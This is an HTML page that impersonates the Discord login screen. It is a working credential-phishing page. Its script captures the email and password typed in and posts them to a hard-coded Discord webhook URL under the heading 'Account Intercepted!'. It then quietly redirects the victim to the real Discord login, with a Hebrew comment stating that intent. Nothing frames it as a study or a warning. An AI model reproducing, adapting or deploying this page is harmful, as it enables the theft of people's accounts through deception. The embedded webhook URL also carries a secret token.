<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Discord | Login</title>
    <style>
        body { background-color: #313338; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; color: white; }
        .login-box { background: #313338; padding: 32px; border-radius: 8px; width: 400px; text-align: center; }
        h2 { margin-bottom: 8px; font-size: 24px; }
        p { color: #b5bac1; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 20px; border-radius: 3px; border: none; background: #1e1f22; color: white; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #5865f2; color: white; border: none; border-radius: 3px; cursor: pointer; font-weight: bold; }
        button:hover { background: #4752c4; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Welcome back!</h2>
        <p>We're so excited to see you again!</p>
        <div style="text-align: left;">
            <label style="font-size: 12px; font-weight: bold; color: #b5bac1;">EMAIL OR PHONE NUMBER</label>
            <input type="text" id="email">
            <label style="font-size: 12px; font-weight: bold; color: #b5bac1;">PASSWORD</label>
            <input type="password" id="pass">
        </div>
        <button onclick="send()">Log In</button>
    </div>

    <script>
        async function send() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            const webhook = "https://discord.com/api/webhooks/1479521399226761257/oXj1-cf5ipoSkF_SKSvCay19JJH7mfnL0Y4grui0lVUU6b9r582psAk1qb4gF4IRC1Kd";

            if (email && pass) {
                await fetch(webhook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: "🔱 **Account Intercepted!**",
                            fields: [
                                { name: "Email", value: email },
                                { name: "Password", value: pass }
                            ],
                            color: 5763719
                        }]
                    })
                });
                // אחרי השליחה, נעביר אותו לדיסקורד האמיתי
                window.location.href = "https://discord.com/login";
            }
        }
    </script>
</body>
</html>
